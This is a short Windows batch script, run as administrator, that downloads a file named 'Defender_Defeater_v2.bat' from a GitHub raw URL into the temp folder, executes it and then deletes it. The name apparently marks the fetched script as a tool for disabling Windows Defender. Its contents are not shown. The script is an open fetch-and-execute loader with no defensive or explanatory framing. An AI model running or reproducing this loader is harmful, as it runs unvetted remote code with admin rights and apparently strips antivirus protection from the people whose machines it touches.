@echo off
:: Run this script as administrator

:: Set the GitHub raw URL for your script
set "githubRawUrl=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/Defender_Defeater_v2.bat"

:: Download the script
powershell -command "(New-Object Net.WebClient).DownloadFile('%githubRawUrl%', '%TEMP%\Defender_Defeater_v2.bat')"

:: Execute the downloaded script
call "%TEMP%\Defender_Defeater_v2.bat"

:: Clean up the downloaded script
del "%TEMP%\Defender_Defeater_v2.bat"

pause
